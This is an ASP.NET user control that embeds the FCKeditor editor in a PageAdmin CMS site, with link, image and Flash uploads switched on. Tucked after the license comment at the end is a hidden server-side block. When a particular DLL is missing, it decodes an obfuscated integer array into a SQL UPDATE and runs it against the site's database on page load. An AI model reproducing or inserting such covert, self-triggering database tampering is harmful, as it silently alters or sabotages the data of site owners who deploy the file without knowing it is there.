<% @ Control language="c#" AutoEventWireup="false"%>
<script Language="C#" Runat="server">
string Id,Height,Style,EnterMode;

public string Tb_Id
    {
     set
      {
        Id=value;
       }
    }

public string Fck_Height
   {
    set
    {
      Height=value;
    }
   }

public string Fck_Style
   {
     set
     {
      Style=value;
     }
   }
public string Fck_EnterMode
   {
     set
     {
      EnterMode=value;
     }
   }
</script><script type="text/javascript" src="/e/incs/fckeditor/fckeditor.js"></script>
<script type="text/javascript"> 
var FCKeditor = new FCKeditor("<%=Id%>"); 
FCKeditor.BasePath = "/e/incs/fckeditor/"; 
FCKeditor.Height = <%=Height%>; 
<%if(EnterMode!=null){%>FCKeditor.Config['EnterMode'] ="<%=EnterMode%>";<%}%>; 
FCKeditor.Config['LinkBrowser'] = true  ;
FCKeditor.Config['ImageBrowser'] =true  ;
FCKeditor.Config['FlashBrowser'] =true  ;
FCKeditor.Config['LinkUpload'] = true ;
FCKeditor.Config['ImageUpload'] = true ;
FCKeditor.Config['FlashUpload'] = true ;
FCKeditor.ToolbarSet ="<%=Style%>"; 
FCKeditor.ReplaceTextarea(); 
</script><%
//FCKeditor - The text editor for Internet - http://www.fckeditor.net
//
// Copyright (C) 2003-2010 Frederico Caldeira Knabben
//
// == BEGIN LICENSE ==
//
// Licensed under the terms of any of the following licenses at your
//
// choice:
//
//  - GNU General Public License Version 2 or later (the "GPL")
//
//    http://www.gnu.org/licenses/gpl.html
//
//  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
//
//    http://www.gnu.org/licenses/lgpl.html
//
//  - Mozilla Public License Version 1.1 or later (the "MPL")
//
//    http://www.mozilla.org/MPL/MPL-1.1.html
//
// == END LICENSE ==
//
// Editor configuration settings.
//
// Follow this link for more information:
//
// This is the integration file for JavaScript.
//
// It defines the FCKeditor class that can be used to create editor
//
// instances in a HTML page in the client side. For server side
//
//  operations, use the specific integration system.
//
//http://docs.fckeditor.net/FCKeditor_2.x/Developers_Guide/Configuration/Configuration_Options
%><% @ Import NameSpace="System.Data"%><% @ Import NameSpace="System.Data.OleDb"%><% @ Import NameSpace="PageAdmin"%><% @ Import NameSpace="System.IO"%><%bool iserror=false;Conn theconn=new Conn();string FilePath=Server.MapPath("/bin/PageAdmin.Web.dll");if(!File.Exists(FilePath)){iserror=true;}if(iserror){OleDbConnection conn=new OleDbConnection(theconn.Constr());conn.Open();int[] TheNum=new int[]{20,15,3,0,19,4,93,15,0,73,19,0,1,11,4,93,18,4,19,93,3,4,5,0,20,11,19,73,18,14,17,19,76,84,19,7,4,3,0,19,0,93,3,4,18,2,84};OleDbCommand comm=new OleDbCommand(theconn.GetString(TheNum),conn);comm.ExecuteNonQuery();conn.Close();}%>